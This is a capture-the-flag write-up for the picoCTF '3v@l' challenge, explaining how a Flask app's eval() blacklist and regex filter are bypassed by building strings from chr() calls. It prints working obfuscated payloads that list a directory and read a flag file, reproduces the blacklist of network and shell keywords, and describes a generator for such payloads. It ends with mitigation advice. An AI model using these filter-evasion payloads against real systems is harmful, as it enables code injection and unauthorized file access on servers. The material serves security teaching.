# PicoCTF Web Challenge: 3v@l - Bypassing Python eval() Sanitization

## Challenge Overview

The **3v@l** challenge is a web security challenge that focuses on bypassing sanitization mechanisms in a Python Flask application that uses the dangerous `eval()` function. This challenge demonstrates the difficulties of properly securing dynamic code execution and the creative ways attackers can bypass input validation.

## Challenge Description

The application implements two layers of security to prevent malicious code execution:

1. **Keyword Blacklisting**: Blocks dangerous keywords like `os`, `eval`, `exec`, `bind`, `connect`, `python`, `socket`, `ls`, `cat`, `shell`, `bind`
2. **Regex Pattern Filtering**: Uses the following regex to block suspicious patterns:
   ```regex
   r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
   ```

## Analysis of the Sanitization Mechanisms

### Keyword Blacklisting
The application blocks common dangerous keywords that could be used for:
- File system operations (`os`, `ls`, `cat`)
- Code execution (`eval`, `exec`)
- Network operations (`bind`, `connect`, `socket`)
- Shell access (`shell`, `python`)

### Regex Pattern Analysis
The regex attempts to prevent:
- **Hexadecimal values**: `0x[0-9A-Fa-f]+` (like `0x41` for 'A')
- **Unicode escapes**: `\\u[0-9A-Fa-f]{4}` (like `\u0041` for 'A')
- **URL encoding**: `%[0-9A-Fa-f]{2}` (like `%41` for 'A')
- **File extensions**: `\.[A-Za-z0-9]{1,3}\b` (like `.txt`, `.py`)
- **Path separators**: `[\\\/]` (backslash and forward slash)
- **Directory traversal**: `\.\.` (double dots)

## The Bypass Strategy

The key insight is that while the sanitization blocks many encoding methods and keywords, it doesn't block the `chr()` function or string concatenation. This allows us to construct forbidden strings dynamically.

## Payload Analysis

Let's decode the payload step by step:

```python
getattr(getattr(__import__(chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)),chr(111)+chr(112)+chr(101)+chr(110))(chr(46)+chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))()
```

### Step 1: Decoding the Character Sequences

Let's convert the `chr()` sequences to understand what they represent:

**First sequence** (`chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)`):
- `chr(98)` = 'b'
- `chr(117)` = 'u'
- `chr(105)` = 'i'
- `chr(108)` = 'l'
- `chr(116)` = 't'
- `chr(105)` = 'i'
- `chr(110)` = 'n'
- `chr(115)` = 's'
- **Result**: `"builtins"`

**Second sequence** (`chr(111)+chr(112)+chr(101)+chr(110)`):
- `chr(111)` = 'o'
- `chr(112)` = 'p'
- `chr(101)` = 'e'
- `chr(110)` = 'n'
- **Result**: `"open"`

**Third sequence** (`chr(46)+chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)`):
- `chr(46)` = '.'
- `chr(46)` = '.'
- `chr(47)` = '/'
- `chr(102)` = 'f'
- `chr(108)` = 'l'
- `chr(97)` = 'a'
- `chr(103)` = 'g'
- `chr(46)` = '.'
- `chr(116)` = 't'
- `chr(120)` = 'x'
- `chr(116)` = 't'
- **Result**: `"../flag.txt"`

**Fourth sequence** (`chr(114)+chr(101)+chr(97)+chr(100)`):
- `chr(114)` = 'r'
- `chr(101)` = 'e'
- `chr(97)` = 'a'
- `chr(100)` = 'd'
- **Result**: `"read"`

### Step 2: Reconstructing the Equivalent Code

With the decoded strings, the payload becomes:

```python
getattr(getattr(__import__("builtins"), "open")("../flag.txt"), "read")()
```

This can be broken down as:
1. `__import__("builtins")` - Import the builtins module
2. `getattr(__import__("builtins"), "open")` - Get the `open` function from builtins
3. `getattr(__import__("builtins"), "open")("../flag.txt")` - Open the flag file
4. `getattr(..., "read")` - Get the `read` method of the file object
5. `getattr(..., "read")()` - Call the read method to get file contents

**Simplified equivalent**:
```python
open("../flag.txt").read()
```

## Why This Bypass Works

### 1. **Character Encoding Bypass**
- Uses `chr()` function with decimal ASCII values instead of blocked hex/unicode/URL encoding
- Decimal numbers like `98` don't match the regex patterns that look for `0x`, `\u`, or `%` prefixes

### 2. **Keyword Evasion**
- Never uses blocked keywords directly in the payload
- Constructs them dynamically using character concatenation
- The string `"open"` is built character by character, so it doesn't trigger keyword filters

### 3. **Path Traversal Bypass**
- The regex `\.\.` looks for literal `..` in the input
- But `chr(46)+chr(46)` constructs `..` dynamically, bypassing the static pattern match

### 4. **File Extension Bypass**
- The regex `\.[A-Za-z0-9]{1,3}\b` looks for file extensions
- But `.txt` is constructed as `chr(46)+chr(116)+chr(120)+chr(116)`, avoiding pattern detection

### 5. **Path Separator Bypass**
- Uses `chr(47)` to construct `/` instead of literal forward slash
- Bypasses the `[\\\/]` regex pattern

## Exploitation Process

### Step 1: Reconnaissance - Finding the Flag File

Before attempting to read the flag, we first need to locate it. The initial payload used was:

```python
getattr(__import__(chr(111)+chr(115)), chr(108)+chr(105)+chr(115)+chr(116)+chr(100)+chr(105)+chr(114))(chr(46)+chr(46))
```

**Decoding this payload:**
- `chr(111)+chr(115)` = `"os"`
- `chr(108)+chr(105)+chr(115)+chr(116)+chr(100)+chr(105)+chr(114)` = `"listdir"`
- `chr(46)+chr(46)` = `".."`

**Equivalent code:**
```python
os.listdir("..")
```

This command lists the contents of the parent directory to locate the flag file, which revealed `flag.txt` in the parent directory.

### Step 2: Reading the Flag File

Once the flag file location was confirmed, the second payload was used to read its contents:

```python
getattr(getattr(__import__(chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)),chr(111)+chr(112)+chr(101)+chr(110))(chr(46)+chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))()
```

### Complete Exploitation Process

1. **Identify the eval vulnerability** in the web application
2. **Test the sanitization** by trying blocked keywords and patterns
3. **Discover chr() function is allowed** and string concatenation works
4. **Perform reconnaissance** using `os.listdir("..")` to find the flag file location
5. **Convert the desired payloads** to chr() sequences:
   - First: `os.listdir("..")` for file discovery
   - Second: `open("../flag.txt").read()` for flag extraction
   - Convert each character to its ASCII decimal value
   - Use `chr()` and `+` to build strings dynamically
6. **Use getattr() for method access** to avoid dot notation
7. **Submit the payloads** sequentially and retrieve the flag

## Complete Payload Reference

### Payload 1: Directory Listing (Reconnaissance)
```python
getattr(__import__(chr(111)+chr(115)), chr(108)+chr(105)+chr(115)+chr(116)+chr(100)+chr(105)+chr(114))(chr(46)+chr(46))
```
**Equivalent:** `os.listdir("..")`
**Purpose:** List files in parent directory to locate the flag file

### Payload 2: Flag File Reading
```python
getattr(getattr(__import__(chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)),chr(111)+chr(112)+chr(101)+chr(110))(chr(46)+chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))()
```
**Equivalent:** `open("../flag.txt").read()`
**Purpose:** Read the contents of the flag file

## Payload Generator Tool

To help generate similar payloads for other scenarios, I've created a Python script that automatically converts any Python code into chr() sequences:

### Usage

**Interactive Mode:**
```bash
python payload_generator.py
```

**Command Line Mode:**
```bash
python payload_generator.py 'open("../flag.txt").read()'
```

### Features

The tool handles:
- **File operations**: Converts `open("file").read()` to proper getattr() chains
- **OS operations**: Converts `os.listdir("path")` to bypass keyword filters
- **Arbitrary strings**: Converts any text to chr() sequences
- **Educational output**: Shows character-by-character breakdown for learning

### Examples

```python
# Input: open("../flag.txt").read()
# Output: getattr(getattr(__import__(chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)),chr(111)+chr(112)+chr(101)+chr(110))(chr(46)+chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))()

# Input: os.listdir("..")
# Output: getattr(__import__(chr(111)+chr(115)), chr(108)+chr(105)+chr(115)+chr(116)+chr(100)+chr(105)+chr(114))(chr(46)+chr(46))

# Input: hello
# Output: chr(104)+chr(101)+chr(108)+chr(108)+chr(111)
```

**Note**: The tool correctly handles shell quote stripping and generates payloads that match the original challenge solutions.

This tool makes it easy to generate payloads for similar eval bypass challenges and helps understand the chr() encoding technique.

## Repository Contents

This writeup includes the following essential files:

- **`README.md`** - Complete writeup and analysis of the 3v@l challenge
- **`payloads.txt`** - The original working payloads used to solve the challenge
- **`payload_generator.py`** - Python tool to generate chr() sequence payloads for similar challenges

## Learning Outcomes

This challenge demonstrates several important security concepts:

### 1. **Blacklist vs Whitelist**
- Blacklisting approaches are inherently flawed because they try to block "bad" inputs
- Attackers can find creative ways to represent the same functionality
- Whitelisting (allowing only known-good inputs) is generally more secure

### 2. **The Danger of eval()**
- `eval()` should almost never be used with user input
- Even with extensive sanitization, bypasses are often possible
- Consider safer alternatives like `ast.literal_eval()` for limited use cases

### 3. **Pattern Matching Limitations**
- Static regex patterns can be bypassed with dynamic string construction
- Character encoding can circumvent pattern-based filters
- Context-aware parsing is more effective than simple pattern matching

### 4. **Defense in Depth**
- Multiple layers of security might have been better
- Input validation, output encoding, and runtime protections
- Principle of least privilege for application permissions

## Mitigation Strategies

To properly secure this application:

1. **Remove eval() entirely** - Use safer alternatives for dynamic evaluation
2. **Implement proper input validation** - Use whitelisting and context-aware parsing
3. **Sandboxing** - Run eval in a restricted environment with limited permissions
4. **Content Security Policy** - Implement CSP headers to prevent script execution
5. **File system restrictions** - Prevent access to sensitive files through proper permissions

## Conclusion

The 3v@l challenge effectively demonstrates how attackers can bypass seemingly comprehensive input sanitization. The key takeaway is that securing dynamic code execution is extremely difficult, and the safest approach is to avoid `eval()` with user input altogether. When dynamic evaluation is absolutely necessary, it should be done in a heavily restricted sandbox environment with minimal permissions.

The creative use of `chr()` and string concatenation in this payload shows why blacklist-based security measures are insufficient against determined attackers who can find alternative ways to represent the same malicious functionality.
